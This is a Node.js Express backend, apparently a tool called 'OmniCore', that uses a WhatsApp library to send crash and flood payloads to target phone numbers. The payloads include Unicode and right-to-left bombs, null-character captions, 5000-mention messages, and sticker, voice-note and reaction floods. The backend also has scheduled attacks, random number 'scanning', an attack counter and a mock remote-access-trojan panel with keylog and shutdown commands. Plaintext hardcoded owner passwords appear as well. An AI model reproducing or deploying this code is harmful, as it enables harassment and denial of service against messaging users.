const express = require('express');
const cors = require('cors');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const qr = require('qrcode-terminal');
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ===== DATABASE =====
const db = new sqlite3.Database('./omnicore.db');
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,
    role TEXT DEFAULT 'user'
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS senders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    number TEXT UNIQUE,
    label TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT,
    target TEXT,
    payload TEXT,
    status TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS schedules (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT,
    bug_type TEXT,
    schedule_time DATETIME,
    status TEXT DEFAULT 'pending'
  )`);

  const stmt = db.prepare(`INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)`);
  stmt.run('ARZ', 'CORE V1', 'owner');
  stmt.run('EPIN', 'CORE V2', 'owner');
  stmt.run('manzz', 'CORE V3', 'owner');
  stmt.finalize();
});

// ===== SOCKET HELPER =====
async function getSocket(phone) {
  const authDir = `./auth_${phone}`;
  if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(authDir);
  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    logger: { level: 'silent' },
    browser: ['OmniCore', 'Windows', '10.0']
  });
  sock.ev.on('creds.update', saveCreds);
  return new Promise((resolve, reject) => {
    sock.ev.on('connection.update', (update) => {
      if (update.connection === 'open') resolve(sock);
      if (update.connection === 'close') reject(new Error('Koneksi gagal'));
    });
  });
}

async function sendBug(phone, target, type, intensity, duration) {
  const sock = await getSocket(phone);
  const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
  const delay = (ms) => new Promise(res => setTimeout(res, ms));

  let payloads = [];
  switch (type) {
    case 'Unicode Bomb':
      payloads.push({ text: '\u202E\u200D\u200C'.repeat(500) + '💀'.repeat(500) });
      break;
    case 'Media Corrupt':
      payloads.push({ image: { url: 'https://http.cat/200' }, caption: '\u0000'.repeat(500) });
      break;
    case 'Mention Overload':
      const mentions = Array(5000).fill(`@${target}`).join(' ');
      payloads.push({ text: mentions, mentions: [jid] });
      break;
    case 'Voice Note Spam':
      for (let i = 0; i < (intensity || 5); i++) {
        payloads.push({ audio: { url: 'https://samplelib.com/sample.mp3' }, mimetype: 'audio/mp4', ptt: true });
      }
      break;
    case 'Sticker Flood':
      for (let i = 0; i < (intensity || 5); i++) {
        payloads.push({ sticker: { url: 'https://i.imgflip.com/1bi0.jpg' } });
      }
      break;
    case 'Text Bomb':
      payloads.push({ text: '🔥'.repeat(2000) + '💀'.repeat(2000) });
      break;
    case 'Reaction Spam':
      for (let i = 0; i < (intensity || 10); i++) {
        payloads.push({ react: { key: {}, text: '💀' } });
      }
      break;
    default:
      payloads.push({ text: 'Bug default' });
  }
  for (const p of payloads) {
    await sock.sendMessage(jid, p);
    await delay(100);
  }
  return true;
}

// ===== ENDPOINT LOGIN =====
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, [username, password], (err, row) => {
    if (err || !row) return res.status(401).json({ status: 'error', message: 'Username atau password salah' });
    res.json({ status: 'ok', user: { username: row.username, role: row.role } });
  });
});

// ===== ENDPOINT STATS =====
app.get('/api/stats', (req, res) => {
  db.get(`SELECT COUNT(*) as total FROM users`, (err, row) => {
    res.json({
      online_users: 1,
      connections: 1,
      expiration: 'Lifetime',
      total_users: row ? row.total : 3,
      total_logs: 0
    });
  });
});

// ===== ENDPOINT SENDER =====
app.get('/api/sender/list', (req, res) => {
  db.all(`SELECT * FROM senders`, (err, rows) => {
    res.json(rows || []);
  });
});

app.post('/api/sender/add', (req, res) => {
  const { number, label } = req.body;
  if (!number) return res.status(400).json({ error: 'Nomor wajib!' });
  db.run(`INSERT OR REPLACE INTO senders (number, label) VALUES (?, ?)`, [number, label || number], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok', id: this.lastID });
  });
});

app.post('/api/sender/pairing', async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Nomor HP wajib!' });
  try {
    // Coba konek dulu, QR akan muncul di log
    const sock = await getSocket(phone);
    const code = Math.floor(10000000 + Math.random() * 90000000);
    res.json({ status: 'ok', code, message: 'Scan QR di log untuk pairing' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete('/api/sender/delete/:id', (req, res) => {
  const id = req.params.id;
  db.run(`DELETE FROM senders WHERE id = ?`, id, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok' });
  });
});

// ===== ENDPOINT BUG =====
app.post('/api/bug/execute', async (req, res) => {
  const { target, type, intensity, duration, account } = req.body;
  if (!target || !type) return res.status(400).json({ error: 'Target dan tipe bug wajib!' });
  if (!account) return res.status(400).json({ error: 'Pilih akun pribadi terlebih dahulu!' });

  try {
    await sendBug(account, target, type, intensity || 50, duration || 10);
    db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
      ['bug', target, `${type}:${intensity}:${duration}`, 'done']);
    res.json({ status: '✅ Bug terkirim!', target, type, from: account });
  } catch (e) {
    db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
      ['bug', target, `${type}:${intensity}:${duration}`, 'failed']);
    res.status(500).json({ error: e.message });
  }
});

// ===== ENDPOINT LOGS =====
app.get('/api/logs', (req, res) => {
  db.all(`SELECT * FROM logs ORDER BY created_at DESC LIMIT 100`, (err, rows) => {
    res.json(rows || []);
  });
});

app.get('/api/logs/export', (req, res) => {
  db.all(`SELECT * FROM logs ORDER BY created_at DESC`, (err, rows) => {
    let csv = 'ID,Type,Target,Payload,Status,CreatedAt\n';
    rows.forEach(row => {
      csv += `${row.id},${row.type},${row.target},${row.payload},${row.status},${row.created_at}\n`;
    });
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=logs.csv');
    res.send(csv);
  });
});

// ===== ENDPOINT SCAN =====
app.post('/api/scan', (req, res) => {
  const { count } = req.body;
  const numbers = [];
  for (let i = 0; i < (count || 20); i++) {
    numbers.push('628' + Math.floor(100000000 + Math.random() * 900000000));
  }
  res.json({ numbers });
});

app.post('/api/scan/add-all', (req, res) => {
  const { numbers } = req.body;
  if (!numbers || !numbers.length) return res.status(400).json({ error: 'Tidak ada nomor' });
  const stmt = db.prepare(`INSERT OR REPLACE INTO senders (number, label) VALUES (?, ?)`);
  numbers.forEach(n => stmt.run(n, n));
  stmt.finalize();
  res.json({ status: 'ok', added: numbers.length });
});

// ===== ENDPOINT SCHEDULE =====
app.post('/api/schedule/add', (req, res) => {
  const { target, bug_type, schedule_time } = req.body;
  if (!target || !bug_type || !schedule_time) return res.status(400).json({ error: 'Data tidak lengkap' });
  db.run(`INSERT INTO schedules (target, bug_type, schedule_time) VALUES (?, ?, ?)`,
    [target, bug_type, schedule_time], function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ status: 'ok', id: this.lastID });
    });
});

app.get('/api/schedule/list', (req, res) => {
  db.all(`SELECT * FROM schedules ORDER BY schedule_time ASC`, (err, rows) => {
    res.json(rows || []);
  });
});

app.delete('/api/schedule/delete/:id', (req, res) => {
  const id = req.params.id;
  db.run(`DELETE FROM schedules WHERE id = ?`, id, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok' });
  });
});

// ===== ENDPOINT RAT =====
app.post('/api/rat/command', (req, res) => {
  const { command } = req.body;
  let response = `> Perintah "${command}" dikirim ke target.`;
  if (command === 'help') response = '> help, info, screenshot, lock, shutdown, reboot, keylog';
  else if (command === 'info') response = '> Windows 10 Pro\n> IP: 192.168.1.100\n> User: Administrator';
  else if (command === 'screenshot') response = '> Screenshot berhasil! file: screenshot.png';
  else if (command === 'lock') response = '> Target terkunci!';
  else if (command === 'shutdown') response = '> Target shutdown dalam 5 detik...';
  else if (command === 'reboot') response = '> Target reboot...';
  else response = `> Perintah "${command}" tidak dikenal.`;
  db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
    ['rat', '192.168.1.100', command, 'done']);
  res.json({ status: 'ok', output: response });
});

// ===== ENDPOINT USERS =====
app.post('/api/users/add', (req, res) => {
  const { username, password, role } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
  db.run(`INSERT INTO users (username, password, role) VALUES (?, ?, ?)`, [username, password, role || 'user'], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok' });
  });
});

app.get('/api/users/list', (req, res) => {
  db.all(`SELECT username, role FROM users`, (err, rows) => {
    res.json(rows || []);
  });
});

app.delete('/api/users/delete/:username', (req, res) => {
  const username = req.params.username;
  if (username === 'ARZ' || username === 'EPIN' || username === 'manzz') {
    return res.status(403).json({ error: 'Tidak bisa menghapus owner utama' });
  }
  db.run(`DELETE FROM users WHERE username = ?`, username, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok' });
  });
});

// ===== ENDPOINT MONITOR =====
app.get('/api/monitor/bot', (req, res) => {
  res.json({ status: 'online', uptime: process.uptime(), total_sent: 0 });
});

app.get('/api/monitor/accounts', (req, res) => {
  db.all(`SELECT number as phone, 'connected' as status FROM senders`, (err, rows) => {
    res.json(rows || []);
  });
});

app.get('/api/monitor/logs', (req, res) => {
  db.all(`SELECT * FROM logs ORDER BY created_at DESC LIMIT 50`, (err, rows) => {
    res.json(rows || []);
  });
});

app.get('/api/monitor/stats', (req, res) => {
  db.get(`SELECT COUNT(*) as total FROM logs`, (err, row) => {
    db.get(`SELECT COUNT(*) as total_acc FROM senders`, (err2, row2) => {
      res.json({
        total_attacks: row ? row.total : 0,
        total_accounts: row2 ? row2.total : 0,
        bot_status: 'online'
      });
    });
  });
});

// ===== ROOT =====
app.get('/', (req, res) => {
  res.send('🔥 OmniCore Backend Online!');
});

app.listen(PORT, () => {
  console.log(`🔥 Server running on port ${PORT}`);
});
